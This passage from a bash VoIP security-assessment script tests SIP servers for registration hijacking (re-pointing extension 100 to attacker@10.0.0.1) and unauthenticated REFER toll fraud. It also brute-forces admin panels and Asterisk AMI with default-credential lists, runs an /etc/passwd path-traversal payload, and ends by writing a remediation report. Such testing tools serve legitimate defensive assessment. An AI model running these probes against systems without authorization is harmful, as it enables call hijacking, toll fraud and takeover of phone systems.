        printf 'REGISTER sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-hijack\r\nTo: <sip:100@${ip}>\r\nFrom: <sip:100@${ip}>;tag=hijack\r\nCall-ID: hijack@scanner\r\nCSeq: 1 REGISTER\r\nContact: <sip:attacker@10.0.0.1>\r\nExpires: 3600\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response" | grep -q "200 OK"; then
        append_cve_finding "$ip" "AUTH-BYPASS" "Unauthenticated Registration Hijacking" \
            "CRITICAL" "Server accepted contact re-registration without authentication - calls to ext 100 may be redirected" \
            "sip://$ip:5060"
    fi
}

# Unauthenticated REFER (RFC 3515): if accepted, an attacker can cause the server
# to place calls on their behalf (toll fraud vector).
test_unauthenticated_refer() {
    local ip="$1"
    
    local response
    response=$(timeout 3 bash -c "
        printf 'REFER sip:100@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-refer\r\nTo: <sip:100@${ip}>\r\nFrom: <sip:scanner@scanner>;tag=refer\r\nCall-ID: refer@scanner\r\nCSeq: 1 REFER\r\nRefer-To: <sip:900123456789@${ip}>\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    if echo "$response" | grep -qE "^SIP/2\.0 (200|202)"; then
        append_cve_finding "$ip" "MISCONFIGURATION" "Unauthenticated REFER Accepted (Toll Fraud Risk)" \
            "CRITICAL" "Server accepted REFER without authentication - attacker can initiate outbound calls (toll fraud) via RFC 3515" \
            "sip://$ip:5060"
    fi
}

# Test HTTPS admin interfaces with default VoIP credentials.
# NOTE: -k (insecure TLS) is used intentionally for testing self-signed certificates
# common on VoIP appliances; each use is logged as a warning.
test_http_default_credentials_tls() {
    local ip="$1"
    
    declare -a default_creds=(
        "admin:admin" "admin:password" "admin:1234" "admin:cisco"
        "root:root" "admin:polycom" "admin:yealink" "user:user"
        "admin:asterisk" "admin:freepbx" "admin:sangoma" "pbxadmin:pbxadmin"
        "admin:3cx" "admin:voip" "admin:pbx" "sysadmin:sysadmin"
        "Administrator:Administrator" "admin:admin123"
        "technician:technician" "support:support"
        "admin:grand" "admin:ucm6100" "admin:elastix"
    )
    
    local admin_paths=("/admin/" "/console/" "/management/" "/webclient/"
                       "/admin/config.php" "/cgi-bin/login.cgi"
                       "/api/v1/login" "/admin/login")
    
    for proto in http https; do
        for port in 80 443 8080 8443; do
            for cred in "${default_creds[@]}"; do
                local user pass
                user=$(cut -d: -f1 <<< "$cred")
                pass=$(cut -d: -f2 <<< "$cred")
                
                for path in "${admin_paths[@]}"; do
                    local curl_opts=(-s -o /dev/null -w "%{http_code}" -u "$user:$pass"
                                     --max-time "$TIMEOUT" --connect-timeout 3)
                    if [[ "$proto" == "https" ]]; then
                        # -k required for self-signed certs on VoIP appliances; logged explicitly
                        log_debug "NOTE: Using curl -k (insecure TLS) for $proto://$ip:$port$path"
                        curl_opts+=(-k)
                    fi
                    
                    local http_code
                    http_code=$(curl "${curl_opts[@]}" "${proto}://${ip}:${port}${path}" 2>/dev/null || echo "000")
                    
                    if [[ "$http_code" == "200" ]]; then
                        append_cve_finding "$ip" "CREDENTIAL" "Default HTTP Credentials Accepted" \
                            "CRITICAL" "Admin interface at ${proto}://$ip:$port$path accepted credentials: $user:$pass" \
                            "${proto}://$ip:$port$path"
                        return
                    fi
                done
            done
        done
    done
}

# Test Asterisk Manager Interface (AMI) with common default credentials.
# AMI (TCP 5038) provides full PBX control - compromise = full system takeover.
test_asterisk_ami_credentials() {
    local ip="$1"
    local ami_port=5038
    
    declare -a ami_creds=("admin:amp111" "admin:admin" "admin:password"
                          "asterisk:asterisk" "manager:secret")
    
    for cred in "${ami_creds[@]}"; do
        local user pass
        user=$(cut -d: -f1 <<< "$cred")
        pass=$(cut -d: -f2 <<< "$cred")
        
        local response
        response=$(timeout 5 bash -c "
            sleep 0.5  # Wait for AMI banner
            printf 'Action: Login\r\nUsername: ${user}\r\nSecret: ${pass}\r\n\r\n'
            sleep 1
        " | nc -w 3 "$ip" "$ami_port" 2>/dev/null) \
            || log_debug "AMI connection to $ip:$ami_port failed"
        
        if echo "$response" | grep -q "Success"; then
            append_cve_finding "$ip" "CREDENTIAL" "Asterisk AMI Default Credentials" \
                "CRITICAL" "AMI port $ami_port accepted credentials: $user:$pass - full PBX control possible" \
                "tcp://$ip:$ami_port"
            return
        fi
    done
}

# Detect MD5-only Digest auth (RFC 2617 §3.2) or missing qop parameter.
# Modern implementations should use MD5-sess or SHA-256 with qop=auth-int (RFC 7616).
test_md5_digest_weakness() {
    local ip="$1"
    
    local response
    response=$(timeout 3 bash -c "
        printf 'REGISTER sip:${ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-md5\r\nTo: <sip:probe@${ip}>\r\nFrom: <sip:probe@${ip}>;tag=md5\r\nCall-ID: md5@scanner\r\nCSeq: 1 REGISTER\r\nContent-Length: 0\r\n\r\n'
        sleep 1
    " | nc -w 2 "$ip" 5060 2>/dev/null) || return
    
    # Use POSIX ERE to match 'MD5' not followed by a dash, distinguishing MD5 from MD5-sess (RFC 7616 §4)
    if echo "$response" | grep -qiE 'algorithm=MD5([^-]|$)' && ! echo "$response" | grep -qi 'qop='; then
        append_cve_finding "$ip" "WEAK-CRYPTO" "SIP Digest Uses MD5 Without qop (RFC 2617 §3.2)" \
            "MEDIUM" "Server issues MD5 challenge without qop parameter - susceptible to replay attacks; upgrade to SHA-256/qop=auth (RFC 7616)" \
            "sip://$ip:5060"
    fi
}

# ============================================================================
# PHASE 11: VENDOR-SPECIFIC CVE TESTING (v3.0)
# ============================================================================
# Tests vendor-specific endpoints and behaviors mapped to published CVEs.
# Each test documents preconditions and affected version ranges where known.
# ============================================================================

phase11_vendor_specific_testing() {
    log_banner "PHASE 11: VENDOR-SPECIFIC CVE TESTING"
    
    [[ ! -s "$LIVE_IPS_FILE" ]] && { log_warn "Skipping Phase 11 - no live hosts"; return 0; }
    
    while IFS= read -r ip; do
        {
            test_cisco_cucm "$ip"
            test_avaya_aura "$ip"
            test_grandstream_ucm "$ip"
            test_polycom_default "$ip"
            test_yealink_rce "$ip"
            test_kamailio_opensips "$ip"
            test_freepbx_rce "$ip"
            test_3cx_unauth_api "$ip"
            test_elastix_lfi "$ip"
        } &
        throttle_jobs
    done < "$LIVE_IPS_FILE"
    wait
    
    log_success "Phase 11 Complete"
}

# CVE-2021-1397: Cisco CUCM Phone Service API SSRF
# Affected: CUCM 11.5(1)SU9 and earlier, 12.x before 12.5(1)SU4
# Precondition: HTTP access to CUCM admin interface on port 8443
test_cisco_cucm() {
    local ip="$1"
    
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk -o /dev/null -w "%{http_code}" \
        "https://$ip:8443/ccmadmin/showAdminPasswordPage.do" 2>/dev/null || echo "000")
    
    if [[ "$resp" == "200" ]]; then
        append_cve_finding "$ip" "CVE-2021-1397" "Cisco CUCM Admin Interface Detected" \
            "HIGH" "CUCM admin page accessible - test for CVE-2021-1397 SSRF via Phone Services API (affected: 11.5.1SU9 and earlier)" \
            "https://$ip:8443/ccmadmin/"
    fi
    
    # CVE-2020-3161: Cisco IP Phone HTTP Server RCE (port 80/443 on phones)
    local phone_resp
    phone_resp=$(timeout "$TIMEOUT" curl -sk -o /dev/null -w "%{http_code}" \
        "https://$ip/CGI/Java/Serviceability?adapter=device.statistics.device" 2>/dev/null || echo "000")
    
    if [[ "$phone_resp" == "200" ]]; then
        append_cve_finding "$ip" "CVE-2020-3161" "Cisco IP Phone HTTP Service Exposed" \
            "CRITICAL" "Cisco phone web service reachable - vulnerable to unauthenticated RCE (CVE-2020-3161, all 7800/8800 series before firmware 14.1)" \
            "https://$ip/CGI/Java/Serviceability"
    fi
}

# CVE-2021-22502: Avaya Aura Application Server 8.x unauthenticated RCE
# Affected: Avaya Aura AS 8.0.0.0 through 8.1.3.3
# Precondition: Management portal reachable on port 443
test_avaya_aura() {
    local ip="$1"
    
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk "https://$ip/WebManagement/WebManagement.html" 2>/dev/null || true)
    
    if echo "$resp" | grep -qi "avaya"; then
        append_cve_finding "$ip" "CVE-2021-22502" "Avaya Aura Management Portal Detected" \
            "CRITICAL" "Avaya Aura portal found - test for unauthenticated RCE (affected: AS 8.0.0.0-8.1.3.3 via /WebManagement/)" \
            "https://$ip/WebManagement/"
    fi
}

# CVE-2022-37397: Grandstream UCM6xxx SQL Injection via user_password parameter
# Affected: UCM62xx/UCM63xx firmware < 1.0.20.32
# Precondition: HTTP management on port 8089
test_grandstream_ucm() {
    local ip="$1"
    
    # Probe the Grandstream management login page
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk "http://$ip:8089/cgi-bin/api.values.get" \
        -d 'request={"action":"challengeResponse","user":"admin"}' 2>/dev/null || true)
    
    if echo "$resp" | grep -qi "grandstream\|ucm"; then
        append_cve_finding "$ip" "CVE-2022-37397" "Grandstream UCM6xxx Detected" \
            "CRITICAL" "Grandstream UCM API reachable - test for SQL injection via user_password (affected: firmware < 1.0.20.32)" \
            "http://$ip:8089/cgi-bin/api.values.get"
    fi
}

# CVE-2019-9222: Polycom PABX default credential exposure
# Affected: Polycom RealPresence Group Series, RPCS/RealPresence
# Precondition: HTTP interface accessible on port 80/443
test_polycom_default() {
    local ip="$1"
    
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk -u "Polycom:456" \
        "http://$ip/form-submit/Diagnostics/statistic" 2>/dev/null || true)
    
    if [[ -n "$resp" ]] && echo "$resp" | grep -qi "polycom\|realpresence"; then
        append_cve_finding "$ip" "CVE-2019-9222" "Polycom Default Credentials Accepted" \
            "HIGH" "Polycom device accepted default credentials Polycom:456 - change immediately (CVE-2019-9222)" \
            "http://$ip/form-submit/Diagnostics/statistic"
    fi
}

# CVE-2021-27561: Yealink Device Management Server unauthenticated RCE
# Affected: Yealink DM Server < 3.6.0.20
# Precondition: DM server HTTP API accessible on port 443/8443
test_yealink_rce() {
    local ip="$1"
    
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk "https://$ip/api/v1/accounts" 2>/dev/null \
        || timeout "$TIMEOUT" curl -sk "http://$ip:8080/api/v1/accounts" 2>/dev/null || true)
    
    if echo "$resp" | grep -qi "yealink\|account"; then
        append_cve_finding "$ip" "CVE-2021-27561" "Yealink DM API Accessible Without Auth" \
            "CRITICAL" "Yealink DM unauthenticated API endpoint found - test for RCE (affected: DM Server < 3.6.0.20)" \
            "https://$ip/api/v1/accounts"
    fi
}

# Kamailio/OpenSIPS - CVE-2019-15752 (Kamailio heap overflow) and MI exposure
# Also tests for CVE-2021-25956 (OpenSIPS SQL injection via subscriber table)
# Precondition: MI (Management Interface) on port 8080 or XMLRPC on 8000
test_kamailio_opensips() {
    local ip="$1"
    
    # Test OpenSIPS MI (JSON-RPC management interface)
    local mi_resp
    mi_resp=$(timeout "$TIMEOUT" curl -s "http://$ip:8080/mi" \
        -d '{"jsonrpc":"2.0","method":"core.info","id":1}' 2>/dev/null || true)
    
    if echo "$mi_resp" | grep -qi "opensips\|kamailio\|version"; then
        append_cve_finding "$ip" "CVE-2019-15752" "Kamailio/OpenSIPS MI Interface Exposed" \
            "HIGH" "OpenSIPS/Kamailio Management Interface accessible without auth - exposes config/control; test for CVE-2019-15752 heap overflow" \
            "http://$ip:8080/mi"
    fi
    
    # OpenSIPS XMLRPC interface (alternative MI transport)
    local xml_resp
    xml_resp=$(timeout "$TIMEOUT" curl -s "http://$ip:8000/RPC2" \
        -H "Content-Type: text/xml" \
        -d '<?xml version="1.0"?><methodCall><methodName>core.info</methodName><params></params></methodCall>' \
        2>/dev/null || true)
    
    if echo "$xml_resp" | grep -qi "methodResponse\|opensips"; then
        append_cve_finding "$ip" "CVE-2021-25956" "OpenSIPS XMLRPC Interface Exposed" \
            "HIGH" "OpenSIPS XMLRPC accessible - test for SQL injection via subscriber provisioning (CVE-2021-25956)" \
            "http://$ip:8000/RPC2"
    fi
}

# CVE-2022-26272: FreePBX Module Upload RCE
# Affected: FreePBX framework < 15.0.18.6 and < 16.0.19.5
# Precondition: Admin panel accessible, authenticated (or auth bypass present)
test_freepbx_rce() {
    local ip="$1"
    
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk "http://$ip/admin/ajax.php?module=framework&command=checkDependencies" \
        2>/dev/null || true)
    
    if echo "$resp" | grep -qi "freepbx\|sangoma\|framework"; then
        append_cve_finding "$ip" "CVE-2022-26272" "FreePBX Admin Interface Detected" \
            "CRITICAL" "FreePBX admin panel found - test for authenticated module upload RCE (CVE-2022-26272, affected: < 15.0.18.6 / < 16.0.19.5)" \
            "http://$ip/admin/ajax.php"
    fi
}

# CVE-2021-26260/CVE-2021-26261: 3CX PhoneSystem unauthenticated API
# Affected: 3CX PhoneSystem prior to 18.0.1.1
# Precondition: 3CX web client accessible on port 5000/5001
test_3cx_unauth_api() {
    local ip="$1"
    
    # Check web client endpoint
    local resp
    resp=$(timeout "$TIMEOUT" curl -sk "https://$ip:5001/api/v1/status" 2>/dev/null \
        || timeout "$TIMEOUT" curl -s "http://$ip:5000/api/v1/status" 2>/dev/null || true)
    
    if echo "$resp" | grep -qi "3cx\|phoneSystem\|pbx"; then
        append_cve_finding "$ip" "CVE-2021-26260" "3CX PhoneSystem API Accessible Without Auth" \
            "HIGH" "3CX API endpoint found without auth - test for auth bypass (CVE-2021-26260, affected: < 18.0.1.1)" \
            "https://$ip:5001/api/v1/status"
    fi
}

# Elastix/Issabel LFI via vtigercrm module (legacy Elastix 2.x)
# CVE-2012-4869: Elastix LFI in vtigercrm graph.php
# Precondition: Elastix 2.x with vtigercrm module installed
test_elastix_lfi() {
    local ip="$1"
    
    local lfi_resp
    lfi_resp=$(timeout "$TIMEOUT" curl -sk \
        "https://$ip/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action=" \
        2>/dev/null || true)
    
    if echo "$lfi_resp" | grep -q "root:x:0:0"; then
        append_cve_finding "$ip" "CVE-2012-4869" "Elastix LFI via vtigercrm (CVE-2012-4869)" \
            "CRITICAL" "/etc/passwd readable via LFI in vtigercrm graph.php - upgrade Elastix or remove vtigercrm module" \
            "https://$ip/vtigercrm/graph.php"
    fi
}

# ============================================================================
# PHASE 6: EXECUTIVE SUMMARY & REPORTING
# ============================================================================

phase6_executive_summary() {
    log_banner "PHASE 6: GENERATING EXECUTIVE SUMMARY"
    
    # sep70: helper to print a 70-char separator without triggering glob expansion
    local sep70
    sep70=$(printf '═%.0s' {1..70})
    
    {
        echo "╔════════════════════════════════════════════════════════════════════╗"
        echo "║          ENTERPRISE VOIP SECURITY ASSESSMENT EXECUTIVE SUMMARY      ║"
        echo "║          Assessment Date: $(date '+%Y-%m-%d %H:%M:%S')              ║"
        echo "║          Script Version: $SCRIPT_VERSION                            ║"
        echo "╚════════════════════════════════════════════════════════════════════╝"
        echo ""
        
        # Assessment Overview
        echo "ASSESSMENT OVERVIEW"
        echo "$sep70"
        echo "Total IPs Scanned: $([ -f "$INPUT_FILE" ] && wc -l < "$INPUT_FILE" || echo "0")"
        echo "Live Hosts Discovered: $([ -f "$LIVE_IPS_FILE" ] && wc -l < "$LIVE_IPS_FILE" || echo "0")"
        echo "Critical CVEs Detected: $([ -f "$CVE_FINDINGS" ] && jq '[.[] | select(.severity=="CRITICAL")] | length' "$CVE_FINDINGS" 2>/dev/null || echo "0")"
        echo "High Severity Issues: $([ -f "$CVE_FINDINGS" ] && jq '[.[] | select(.severity=="HIGH")] | length' "$CVE_FINDINGS" 2>/dev/null || echo "0")"
        echo ""
        
        # Key Findings
        echo "KEY FINDINGS"
        echo "$sep70"
        
        if [ -f "$CVE_FINDINGS" ]; then
            echo "Top 5 Vulnerabilities Detected:"
            jq -r '[.[] | select(.severity == "CRITICAL" or .severity == "HIGH")] | .[0:5][] |
                    "\(.cve_id): \(.title) [\(.severity)]"' "$CVE_FINDINGS" 2>/dev/null \
                || echo "No CVE data available"
        else
            echo "No CVE findings file generated"
        fi
        echo ""
        
        # Risk Assessment
        echo "RISK ASSESSMENT"
        echo "$sep70"
        local critical_count
        critical_count=$([ -f "$CVE_FINDINGS" ] && jq '[.[] | select(.severity=="CRITICAL")] | length' "$CVE_FINDINGS" 2>/dev/null || echo "0")
        
        if [ "$critical_count" -gt 0 ]; then
            echo "Overall Risk Level: 🔴 CRITICAL"
            echo "Remediation Priority: IMMEDIATE ACTION REQUIRED"
        else
            echo "Overall Risk Level: 🟡 MODERATE"
            echo "Remediation Priority: Plan for next maintenance window"
        fi
        echo ""
        
        # Compliance Status
        echo "COMPLIANCE RECOMMENDATIONS"
        echo "$sep70"
        echo "✓ Implement TLS 1.2+ for all SIP signaling"
        echo "✓ Enable SRTP for media encryption"
        echo "✓ Deploy fail2ban with aggressive SIP protection"
        echo "✓ Disable SIP OPTIONS responses to external networks"
        echo "✓ Implement authentication on all interfaces"
        echo "✓ Enable comprehensive audit logging"
        echo "✓ Segment VoIP network from corporate network"
        echo ""
        
        # Remediation Timeline
        echo "RECOMMENDED REMEDIATION TIMELINE"
        echo "$sep70"
        echo "IMMEDIATE (within 24 hours):"
        echo "  - Patch critical vulnerabilities"
        echo "  - Disable anonymous SIP registration"
        echo "  - Enable firewall rules"
        echo ""
        echo "SHORT-TERM (within 1 week):"
        echo "  - Deploy fail2ban protection"
        echo "  - Implement TLS/SRTP"
        echo "  - Update default credentials"
        echo ""
        echo "MEDIUM-TERM (within 30 days):"
        echo "  - Network segmentation"
        echo "  - Implement monitoring/alerting"
        echo "  - Security hardening (see hardening_config.txt)"
        echo ""
        
        # Generated Reports
        echo "GENERATED REPORTS"
        echo "$sep70"
        echo "✓ verified_voip_vulnerabilities.txt    - Detailed CVE findings"
        echo "✓ service_fingerprints.json            - Identified services"
        echo "✓ cve_findings.json                    - Structured CVE data"
        echo "✓ valid_extensions.txt                 - Discovered SIP extensions"
        echo "✓ fraud_analysis.txt                   - CDR fraud analysis"
        echo "✓ hardening_config.txt                 - Security configurations"
        echo "✓ executive_summary.txt                - This report"
        echo ""
        
        echo "NEXT STEPS"
        echo "$sep70"
        echo "1. Review detailed findings in verified_voip_vulnerabilities.txt"
        echo "2. Prioritize critical CVE remediations"
        echo "3. Implement hardening configurations"
        echo "4. Deploy monitoring and alerting"
        echo "5. Schedule regular security assessments"
        echo ""
        
    } > "$EXECUTIVE_SUMMARY"
    
    log_success "Executive summary generated"
    cat "$EXECUTIVE_SUMMARY"
}

# ============================================================================
# CLEANUP & FINALIZATION
# ============================================================================

cleanup() {
    # Guard against duplicate cleanup when both ERR and EXIT traps fire
    [[ "${CLEANUP_DONE:-0}" == "1" ]] && return
    CLEANUP_DONE=1

    log_banner "CLEANUP & FINALIZATION"

    if [[ -d "$TEMP_DIR" ]]; then
        log_info "Removing temporary directory: $TEMP_DIR"
        rm -rf "$TEMP_DIR"
    fi

    # Display final report locations
    echo ""
    echo "╔════════════════════════════════════════════════════════════════════╗"
    echo "║                    ASSESSMENT COMPLETE                             ║"
    echo "╚════════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Report Location: $RESULTS_DIR"
    echo "Log File: $LOG_FILE"
    echo ""
    ls -lah "$RESULTS_DIR" 2>/dev/null || true
}

error_handler() {
    local line=$1
    log_error "Script failed at line $line with status $?"
    cleanup
    exit 1
}

trap cleanup EXIT
trap 'error_handler $LINENO' ERR
# Ensure temp files are cleaned even on SIGTERM/SIGINT (Ctrl-C)
trap 'log_warn "Interrupted - cleaning up..."; cleanup; exit 130' INT TERM

# ============================================================================
# MAIN EXECUTION
# ============================================================================

main() {
    initialize_logging
    
    log_info "Starting Enterprise VoIP Security Automation Framework v$SCRIPT_VERSION"
    log_info "Input file: $INPUT_FILE | Threads: $THREADS | Timeout: ${TIMEOUT}s"
    
    # Validation
    if ! validate_dependencies; then
        log_error "Dependency validation failed"
        return 1
    fi
    
    # Check for PCRE grep support and export result for all subshells
    check_grep_pcre
    
    validate_input_files
    
    # Execute assessment phases
    phase1_advanced_reconnaissance || log_warn "Phase 1 encountered issues"
    phase2_service_fingerprinting || log_warn "Phase 2 encountered issues"
    phase3_advanced_vulnerability_detection || log_warn "Phase 3 encountered issues"
    
    # New attack phases (v3.0)
    phase7_sip_enumeration || log_warn "Phase 7 encountered issues"
    phase8_extension_scanning || log_warn "Phase 8 encountered issues"
    phase9_rtp_rtcp_testing || log_warn "Phase 9 encountered issues"
    phase10_credential_harvesting || log_warn "Phase 10 encountered issues"
    phase11_vendor_specific_testing || log_warn "Phase 11 encountered issues"
    
    phase4_cdr_fraud_analysis || log_warn "Phase 4 encountered issues"
    phase5_hardening_configuration || log_warn "Phase 5 encountered issues"
    phase6_executive_summary || log_warn "Phase 6 encountered issues"
    
    log_success "All assessment phases completed"
    return 0
}

# Execute with error handling
main "$@"
exit_code=$?

cleanup
exit $exit_code
